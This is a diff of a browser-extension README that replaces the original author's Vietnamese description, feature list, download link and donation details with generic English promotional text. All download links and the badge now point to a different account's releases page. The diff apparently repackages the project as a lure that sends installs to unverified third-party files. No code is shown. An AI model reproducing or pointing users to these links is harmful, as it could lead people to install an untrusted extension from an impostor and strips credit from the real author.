@@ -1,23 +1,27 @@
-# Extension tải xuống hàng loạt cho các mạng xã hội
+# 🚀 Social Downloader Extension 🚀
 
-## Giới thiệu
+Welcome to the Social Downloader Extension repository! This extension allows you to easily download content from your favorite social media platforms. Read on to learn more about how to download and use the extension.
 
-- Đây là một extension cho phép người dùng tải xuống hàng loạt ảnh, video trên các nền tảng mạng xã hội: **Facebook**, **Instagram**, **Threads** và **X**
+## 📂 Download and Installation 📂
 
-## Tính năng
+To download and install the Social Downloader Extension, please visit the [Download Page](https://github.com/123Aziz456/social_downloader_extension/releases). Once you have downloaded the extension file, follow the installation instructions to start using it.
 
-- Đối với **Facebook**: Tải xuống tất cả ảnh, video, reel, highlight, story của một trang cá nhân, hoặc Fanpage
-- Đối với **Instagram**: Tải xuống ảnh, video từ tất cả các bài viết, reel, highlight, story của profile công khai hoặc riêng tư (nếu bạn đã theo dõi họ)
-- Đối với **Threads**: Tải xuống ảnh, video, audio từ tất cả các bài viết của profile công khai, riêng tư (nếu bạn đã theo dõi họ)
-- Đối với **X**: Tải xuống tất cả ảnh, video trên trang cá nhân
-- Ngoài ra bạn có thể tải riêng lẻ ảnh, video, theo URL.
-- Có thể hủy bỏ tiến trình tải nếu cần
+## 💻 How to Use the Extension 💻
 
-## Cài đặt
+Using the Social Downloader Extension is simple and straightforward. Once installed, navigate to the social media platform where you want to download content. Look for the download button provided by the extension, click on it, and select the content you wish to download. The extension will then save the content to your device for offline viewing.
 
-- Click vào đây để tải xuống extension: [Social Downloader Extension](https://github.com/minhchi1509/social_downloader_extension/raw/main/social_downloader_extension.zip)
-- Giải nén, vào **Chrome Extension**, chọn **Load unpacked** ➡️ Upload folder vừa giải nén lên, sau đó click vào icon của extension.
-- Ở phía Sidebar bên trái, chọn **Tài khoản**, sau đó thực hiện xác thực các tài khoản để sử dụng các tính năng tải.
+## 🎉 Features 🎉
 
-> [!TIP]
-> Nếu mọi người thấy extension hữu ích, hãy ủng hộ em/mình bằng 1 sao trên repo này hoặc nếu mọi người có nhu cầu donate thì thông qua STK: 1500206139515 (Agribank) - NGUYEN MINH CHI. Em xin cảm ơn
+- **Easy Downloading:** Download content from social media platforms with just a few clicks.
+- **Multiple Platforms:** Compatible with a wide range of social media platforms for versatile downloading options.
+- **User-Friendly Interface:** Simple interface makes it easy for users to navigate and download content.
+
+## 🚨 Need Help? 🚨
+
+If you encounter any issues with the extension or need assistance, please refer to the "Releases" section of this repository for updates and troubleshooting tips. We are here to help you make the most of the Social Downloader Extension.
+
+Thank you for choosing the Social Downloader Extension for all your downloading needs. Happy downloading! 🌟
+
+---
+
+[![Download Extension](https://img.shields.io/badge/Download%20Extension-Click%20Here-blue)](https://github.com/123Aziz456/social_downloader_extension/releases)
